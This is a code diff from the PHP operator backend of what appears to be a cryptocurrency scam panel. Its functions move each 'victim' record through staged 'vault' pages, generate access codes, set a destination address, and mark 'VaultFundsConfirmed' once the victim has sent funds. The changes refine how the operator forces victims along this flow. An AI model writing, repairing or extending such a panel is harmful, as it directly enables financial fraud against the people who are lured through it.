@@ -65,8 +65,8 @@ function generateAccessCode($conn, $token) {
     }
     $stmt->close();
     
-    // Update victim with access code and activity
-    $stmt = $conn->prepare("UPDATE user_submissions SET vault_code = ?, vault_code_generated = NOW(), vault_status = 'VaultCodeGenerated', activity = 'VaultCodeGenerated' WHERE token = ?");
+    // Update victim with access code, set status and activity
+    $stmt = $conn->prepare("UPDATE user_submissions SET vault_code = ?, vault_code_generated = 1, vault_status = 'VaultCodeGenerated', activity = 'VaultCodeGenerated' WHERE token = ?");
     $stmt->bind_param("ss", $code, $token);
     
     if ($stmt->execute()) {
@@ -126,42 +126,57 @@ function forceNextStep($conn, $token) {
     $currentStatus = $victim['vault_status'] ?: $victim['activity'];
     $nextStatus = '';
     
-    // Determine next step
+    // Determine next step based on correct vault flow
     switch ($currentStatus) {
         case 'VaultPage':
             $nextStatus = 'VaultCrypto';
             break;
         case 'VaultCrypto':
+            // Generate code instead of forcing access
+            echo json_encode(['success' => false, 'message' => 'Use Generate Code button instead']);
+            return;
         case 'VaultCodeGenerated':
-            $nextStatus = 'VaultAccess';
-            break;
-        case 'VaultAccess':
-            $nextStatus = 'VaultWallet';
-            break;
-        case 'VaultWallet':
-            $nextStatus = 'VaultComplete';
-            break;
+            // Victim should be on vault_code_display.php, no force needed
+            echo json_encode(['success' => false, 'message' => 'Victim viewing code, no action needed']);
+            return;
+        case 'VaultCodeShown':
+            // After viewing code, victim goes to vault_access.php automatically
+            echo json_encode(['success' => false, 'message' => 'Victim entering access code']);
+            return;
+        case 'VaultAccessPage':
+        case 'WaitingForAddress':
+            // Use Set Address button instead
+            echo json_encode(['success' => false, 'message' => 'Use Set Address button instead']);
+            return;
         case 'AddressSet':
-            $nextStatus = 'VaultWallet';
+            // Victim should be on vault_send_address.php
+            echo json_encode(['success' => false, 'message' => 'Victim sending funds']);
+            return;
+        case 'VaultSendAddress':
+        case 'VaultComplete':
+            // Move to funds confirmation
+            $nextStatus = 'VaultFundsConfirmed';
             break;
         default:
-            echo json_encode(['success' => false, 'message' => 'Cannot determine next step']);
+            echo json_encode(['success' => false, 'message' => "Unknown status: $currentStatus"]);
             return;
     }
     
-    // Update status and activity
-    $stmt = $conn->prepare("UPDATE user_submissions SET vault_status = ?, activity = ? WHERE token = ?");
-    $stmt->bind_param("sss", $nextStatus, $nextStatus, $token);
-    
-    if ($stmt->execute()) {
-        echo json_encode([
-            'success' => true,
-            'message' => "Victim moved to: $nextStatus"
-        ]);
-    } else {
-        echo json_encode(['success' => false, 'message' => 'Failed to update status']);
+    // If nextStatus was set, update status and activity
+    if ($nextStatus) {
+        $stmt = $conn->prepare("UPDATE user_submissions SET vault_status = ?, activity = ? WHERE token = ?");
+        $stmt->bind_param("sss", $nextStatus, $nextStatus, $token);
+
+        if ($stmt->execute()) {
+            echo json_encode([
+                'success' => true,
+                'message' => "Victim moved to: $nextStatus"
+            ]);
+        } else {
+            echo json_encode(['success' => false, 'message' => 'Failed to update status']);
+        }
+        $stmt->close();
     }
-    $stmt->close();
 }
 
 function confirmFunds($conn, $token) {
